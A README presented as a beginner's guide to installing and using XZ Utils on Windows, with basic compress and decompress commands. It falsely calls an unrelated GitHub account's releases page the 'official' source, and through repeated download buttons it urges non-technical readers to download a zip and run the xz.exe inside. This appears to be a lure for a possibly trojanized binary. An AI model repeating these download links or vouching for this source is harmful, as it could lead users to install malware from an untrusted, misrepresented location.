# 🗜️ xz - Simple File Compression for Windows

[![Download xz](https://img.shields.io/badge/Download-xz-blue?style=for-the-badge)](https://github.com/aipariqo-png/xz/releases)

xz, also called XZ Utils, is a small program that helps you compress and decompress files on your Windows computer. If you want to save space or send smaller files, xz can help you do that easy and fast. This guide shows you how to get xz, install it, and start using it step by step.

---

## 📦 What is xz?

xz is a tool that works with compressed files. It reduces the size of files using its internal algorithm, so the files take less space on your disk or while transferring over the internet. It's a free and open program designed for use from the command line, but don’t worry—this guide will make everything clear even if you don't know much about computers.

---

## 🖥️ System Requirements

Before installing xz, check these points to make sure your computer will support it:

- Windows 7, 8, 10, or newer versions
- At least 50 MB of free space for installing the program
- Administrative rights are not required but helpful for some features
- Works on both 32-bit and 64-bit versions of Windows

---

## 🌐 Download xz

To get xz, you need to **visit the official release page**. This page has the latest version of the program ready to download.

[![Get xz](https://img.shields.io/badge/Get_xz-GitHub%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/aipariqo-png/xz/releases)

1. Click the button above or visit:  
   https://github.com/aipariqo-png/xz/releases
2. On the releases page, look for the latest release.  
3. Download the file named something like:  
   `xz-win64.zip` (or `xz-win32.zip` if your system is 32-bit)  
4. Save the file to a folder you can easily find, for example, your Desktop or Downloads.

---

## 💾 How to Install xz on Windows

After you download the zip file, follow these steps:

1. Open the folder where you saved the zip file.
2. Right-click on the zip file and select **Extract All...** from the menu.
3. Choose a location to extract the files, such as a new folder on your Desktop.
4. After extraction, you will see several files including `xz.exe`. This is the program file you will use.
5. No special installation program is needed. The software is ready to use.

---

## 🚀 Running xz for the First Time

You can use xz from the Command Prompt, which lets you type commands for the computer.

### How to open Command Prompt:

- Press the **Windows key** on your keyboard.
- Type **cmd**.
- Click on **Command Prompt** to open it.

### Using xz to Compress a File

1. Move the file you want to compress to the same folder as `xz.exe` or note the full path of your file.
2. In the Command Prompt window, type a command like this:

```
xz filename.txt
```

Replace `filename.txt` with the name of your file.

3. Press **Enter**.  
4. xz will create a compressed file called `filename.txt.xz` in the same folder.

### To decompress a file:

Type:

```
xz -d filename.txt.xz
```

Replace `filename.txt.xz` with your compressed file name. This will restore the original file.

---

## 🧰 Common Commands

Keep these useful commands for xz handy:

| Command                 | What it does                           |
|-------------------------|--------------------------------------|
| `xz filename`           | Compress `filename`                   |
| `xz -d filename.xz`     | Decompress `filename.xz`              |
| `xz -l filename.xz`     | Show information about compressed file |
| `xz -k filename`        | Keep original file after compressing |

---

## 📁 How to Use xz with Windows File Explorer (Optional)

If you work mostly in File Explorer and want something simpler:

- You can move files by dragging and dropping to the folder that holds `xz.exe`.
- Use the command prompt as described to compress or decompress files.
- Advanced users sometimes create batch files or shortcuts to run xz commands easily. This requires extra setup beyond this guide.

---

## 🔧 Troubleshooting Tips

- If `xz` command is not found, make sure you are in the folder where `xz.exe` is located or use the full path to the file.
- File paths with spaces can cause problems. Use quotes around the file name, for example:  
  `xz "My File.txt"`
- If you get errors about permissions, try running Command Prompt as administrator:
  - Right-click on Command Prompt in the Start menu
  - Select “Run as administrator”

---

## 💡 Additional Information

xz is often used to handle large files like backups, documents, and media. It can compress files more than basic zip software but may take longer to run. It’s designed for people comfortable using simple command lines but aims to be straightforward enough for anyone to follow.

---

[![Download xz](https://img.shields.io/badge/Download-xz-blue?style=for-the-badge)](https://github.com/aipariqo-png/xz/releases)